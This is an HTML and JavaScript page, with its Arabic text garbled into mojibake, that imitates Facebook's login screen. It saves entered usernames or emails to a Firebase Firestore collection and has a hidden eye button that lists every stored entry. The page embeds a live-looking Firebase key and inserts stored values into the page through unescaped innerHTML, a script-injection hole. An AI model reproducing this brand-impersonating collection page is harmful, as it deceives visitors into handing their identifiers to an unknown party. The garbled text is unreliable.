<!DOCTYPE html>  
<html lang="ar">    
<head>    
    <meta charset="UTF-8">    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
    <title>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ - ÙÙŠØ³Ø¨ÙˆÙƒ</title>    
    <link rel="stylesheet" href="styles.css">    
</head>    
<body>    

<!-- âœ… Ø²Ø± Ø¹Ø±Ø¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† -->
<button id="show-users-btn">ğŸ‘ï¸</button>

<!-- âœ… Ù†Ø§ÙØ°Ø© Ù…Ù†Ø¨Ø«Ù‚Ø© Ù„Ø¹Ø±Ø¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† -->
<div id="users-modal" class="users-modal" style="display: none;">
    <div class="users-modal-content">
        <span class="close-btn">&times;</span>
        <h3>Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙˆÙ† Ø§Ù„Ù…Ø³Ø¬Ù„ÙˆÙ†:</h3>
        <ul id="users-list"></ul>
    </div>
</div>

<div class="container">    
    <div class="logo">    
        <h1>Facebook</h1>    
        <p>ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø£ØµØ¯Ù‚Ø§Ø¡ ÙˆØ§Ù„Ø¹Ø§Ù„Ù… Ù…Ù† Ø­ÙˆÙ„Ùƒ.</p>    
    </div>    

    <!-- âœ… Ù‚Ø³Ù… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ -->    
    <div id="login-box" class="login-box">    
        <form id="login-form">    
            <label for="username">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>    
            <input type="text" id="username" name="username" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø£Ùˆ Ø§Ù„Ù‡Ø§ØªÙ">    
            <p class="error-message" id="username-error"></p>    

            <label for="password">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>    
            <input type="password" id="password" name="password" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">    
            <p class="error-message" id="password-error"></p>    

            <button type="submit" name="login">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>    
            <a href="#">Ù‡Ù„ Ù†Ø³ÙŠØª ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±ØŸ</a>    
            <hr>    
            <button type="button" class="signup" id="signup-btn">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</button>    
        </form>    
    </div>    

    <!-- âœ… Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø±ÙˆØ· ÙˆØ§Ù„Ø£Ø­ÙƒØ§Ù… -->    
    <div class="terms">    
        <input type="checkbox" id="terms-checkbox">    
        <label for="terms-checkbox">    
            Ø£ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ <a href="#" id="show-terms">Ø§Ù„Ø´Ø±ÙˆØ· ÙˆØ§Ù„Ø£Ø­ÙƒØ§Ù…</a> Ùˆ    
            <a href="#" id="show-privacy">Ø³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ©</a>.    
        </label>    
        <p class="error-message" id="terms-error"></p>    
    </div>    

    <!-- âœ… Ø§Ù„Ù†ÙˆØ§ÙØ° Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø© Ù„Ù„Ø´Ø±ÙˆØ· ÙˆØ§Ù„Ø£Ø­ÙƒØ§Ù… ÙˆØ³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ© -->    
    <div id="terms-modal" class="modal">    
        <div class="modal-content">    
            <span class="close" onclick="closeModal('terms-modal')">&times;</span>    
            <h2>Ø§Ù„Ø´Ø±ÙˆØ· ÙˆØ§Ù„Ø£Ø­ÙƒØ§Ù…</h2>    
            <p>Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ù„Ù‡Ø°Ø§ Ø§Ù„Ù…ÙˆÙ‚Ø¹ØŒ ÙØ¥Ù†Ùƒ ØªÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø´Ø±ÙˆØ· ÙˆØ§Ù„Ø£Ø­ÙƒØ§Ù… Ø§Ù„ØªØ§Ù„ÙŠØ©...</p>    
        </div>    
    </div>    

    <div id="privacy-modal" class="modal">    
        <div class="modal-content">    
            <span class="close" onclick="closeModal('privacy-modal')">&times;</span>    
            <h2>Ø³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ©</h2>    
            <p>Ù†Ø­Ù† Ù†Ø­ØªØ±Ù… Ø®ØµÙˆØµÙŠØªÙƒ ÙˆÙ†Ø­Ù…ÙŠ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ. ÙŠØªÙ… Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙ‚Ø· Ù„Ø£ØºØ±Ø§Ø¶ ØªØ­Ø³ÙŠÙ† Ø§Ù„Ø®Ø¯Ù…Ø©...</p>    
        </div>    
    </div>    
</div>    

<!-- âœ… ØªØ¶Ù…ÙŠÙ† Firebase -->
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
    import { getFirestore, collection, getDocs, addDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

    // âœ… Ø¥Ø¹Ø¯Ø§Ø¯ Firebase Ø¨Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù…Ø´Ø±ÙˆØ¹Ùƒ
    const firebaseConfig = {
        apiKey: "AIzaSyDa-I7puzRzbHdB67-cbN38245bpPBIHBQ",
        authDomain: "mywebapp-cf20a.firebaseapp.com",
        projectId: "mywebapp-cf20a",
        storageBucket: "mywebapp-cf20a.appspot.com",
        messagingSenderId: "998444047596",
        appId: "1:998444047596:android:8337c6ecb6a0903f3159c9"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // âœ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† ÙÙŠ Firestore Ø¹Ù†Ø¯ Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯
    document.getElementById("signup-btn").addEventListener("click", async function() {
        let username = document.getElementById("username").value.trim();
        let email = username.includes("@") ? username : username + "@example.com";

        if (!username) {
            alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…!");
            return;
        }

        try {
            await addDoc(collection(db, "users"), { username, email, createdAt: new Date() });
            alert("ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ù†Ø¬Ø§Ø­!");
        } catch (e) {
            console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ³Ø¬ÙŠÙ„:", e);
        }
    });

    // âœ… Ø¹Ø±Ø¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø±
    document.getElementById("show-users-btn").addEventListener("click", async function() {
        const usersList = document.getElementById("users-list");
        const usersModal = document.getElementById("users-modal");
        usersList.innerHTML = "<li>â³ Ø¬Ø§Ø±Ù ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†...</li>";

        try {
            const querySnapshot = await getDocs(collection(db, "users"));
            usersList.innerHTML = "";

            if (querySnapshot.empty) {
                usersList.innerHTML = "<li>ğŸš« Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…Ø³ØªØ®Ø¯Ù…ÙˆÙ† Ù…Ø³Ø¬Ù„ÙˆÙ†.</li>";
            } else {
                querySnapshot.forEach(doc => {
                    let user = doc.data();
                    usersList.innerHTML += `<li>ğŸ‘¤ ${user.username} | ğŸ“§ ${user.email || "ØºÙŠØ± Ù…ØªÙˆÙØ±"}</li>`;
                });
            }
        } catch (e) {
            console.error("Ø®Ø·Ø£ ÙÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ", e);
            usersList.innerHTML = "<li>âŒ Ø­Ø¯Ø« Ø®Ø·Ø£. Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.</li>";
        }

        usersModal.style.display = "block"; // Ø¹Ø±Ø¶ Ø§Ù„Ù†Ø§ÙØ°Ø©
    });

    // âœ… Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ù†Ø§ÙØ°Ø©
    document.querySelector(".close-btn").addEventListener("click", function () {
        document.getElementById("users-modal").style.display = "none";
    });

</script>  

</body>    
</html>
